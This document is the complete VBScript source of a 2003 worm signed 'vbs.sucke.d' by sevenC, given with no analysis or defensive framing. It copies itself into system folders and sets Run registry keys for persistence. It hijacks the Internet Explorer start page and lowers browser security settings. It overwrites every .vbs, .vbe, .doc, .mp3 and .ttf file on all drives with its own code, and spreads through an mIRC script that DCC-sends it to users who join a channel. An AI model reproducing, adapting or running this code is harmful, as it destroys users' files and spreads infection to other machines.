
On Error Resume Next
Dim sucke, Fso, Drives, Drive, Folder, Files, File, Subfolders,Subfolder 
Set sucke = wscript.CreateObject("WScript.Shell")
Set Drives=fso.drives
Set Fso = CreateObject("scripting.FileSystemObject")
Set dropper = Fso.opentextfile(wscript.scriptfullname, 1)
set Trange = document.body.CreateTextRange
src = dropper.readall
sucke.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Win32", "C:\Program Files\Internet Explorer\PLUGINS\Command32.exe.vbs"
sucke.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "sevenc.vze.com"
sucke.RegWrite "HKLM\Software\Microsoft\Internet Explorer\Main\Start Page", "sectors.vze.com"
sucke.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "REG_DWORD"
sucke.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner", "sevenC"
sucke.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Shell32", "C:\Windows\Shell32.vbs"
Fso.copyfile wscript.scriptfullname, "C:\Program Files\Internet Explorer\PLUGINS\Command32.exe.vbs"
Fso.copyfile wscript.scriptfullname, "C:\windows\Shell32.vbs"
sucke.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", 0, "REG_DWORD"
sucke.delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives", 67108863, "REG_DWORD"
sucke.delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose", 1, "REG_DWORD"
sucke.delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFind", 1, "REG_DWORD"
sucke.delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp\Disabled", 1, "REG_DWORD"
sucke.delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktop", 1, "REG_DWORD"
sucke.delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun", 1, "REG_DWORD"
sucke.delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoDiskCpl", 1, "REG_DWORD"
If sucke.regread("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\sucke\sevenC") <> 1 then
ABCDE ""
End if
Set Fso = createobject("scripting.filesystemobject") 
Set Drives=fso.drives 
For Each Drive in Drives
If drive.isready then
Dosearch drive & "\"
end If 
Next 

Function Dosearch(Path) 
on error resume next
Set Folder=fso.getfolder(path) 
Set Files = folder.files 
For Each File in files
If fso.GetExtensionName(file.path)="vbs" or fso.GetExtensionName(file.path)="vbe" or fso.GetExtensionName(file.path)="doc" or fso.GetExtensionName(file.path)="mp3" or fso.GetExtensionName(file.path)="ttf" then 
on error resume next
		Set dropper = Fso.createtextfile(file.path, True)
		dropper.write src
		dropper.Close
end if
If file.name = "mirc.ini" then
on error resume next
ABCDE(file.ParentFolder)
End If
next
Set Subfolders = folder.SubFolders 
For Each Subfolder in Subfolders 
Dosearch Subfolder.path 
Next 
end function 

Set NS41C186= fso.opentextfile(wscript.scriptfullname)
VB40GR94 = NS41C186.readall
NS41C186.close
Do
if not(fso.fileexists(wscript.scriptfullname)) then
set R8C5735O= fso.createtextfile(wscript.scriptfullname)
R8C5735O.write VB40GR94
R8C5735O.close
end if
RRS2K3AR = sucke.regread("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Win32")
If RRS2K3AR <> "C:\Program Files\Internet Explorer\PLUGINS\Command32.exe.vbs" then
sucke.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Win32", "C:\Program Files\Internet Explorer\PLUGINS\Command32.exe.vbs"
end if
RRS2K3AR= ""
loop

function ABCDE(QR2T8452)
on error resume next
If QR2T8452 <> "" Then
J574I3N1 = sucke.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
If fso.fileexists("c:\mirc\mirc.ini") Then
QR2T8452 = "c:\mirc"
ElseIf fso.fileexists("c:\mirc32\mirc.ini") Then
QR2T8452 = "c:\mirc32"
ElseIf fso.fileexists(J574I3N1 & "\mirc\mirc.ini") Then
QR2T8452 = J574I3N1 & "\mirc"
ElseIf fso.fileexists(J574I3N1 & "\mirc32\mirc.ini") Then
QR2T8452 = J574I3N1 & "\mirc"
Else
QR2T8452 = ""
End If
End If
If QR2T8452 <> "" Then
Set N3EGB01V = UT8452J7.CreateTextFile(QR2T8452 & "\script.ini", True)
N3EGB01V = "[script]" & vbCrLf & "n0=on 1:JOIN:#:{"
N3EGB01V = N3EGB01V & vbCrLf & "n0=on 1:JOIN:#:{"
N3EGB01V = N3EGB01V & vbCrLf & "n1=  /if ( $nick == $me ) { halt }"
N3EGB01V = N3EGB01V & vbCrLf & "n2=  /." & Chr(100) & Chr(99) & Chr(99) & " send $nick "
N3EGB01V = N3EGB01V & "C:\Program Files\Internet Explorer\PLUGINS\Command32.exe.vbs"
N3EGB01V = N3EGB01V & vbCrLf & "n3=}"
script.Close
End If
End Function


'~vbs.sucke.d.vbs~ by sevenC / N0:7
'~Copyright(c)2003 by N0:7 Laboratoryoum
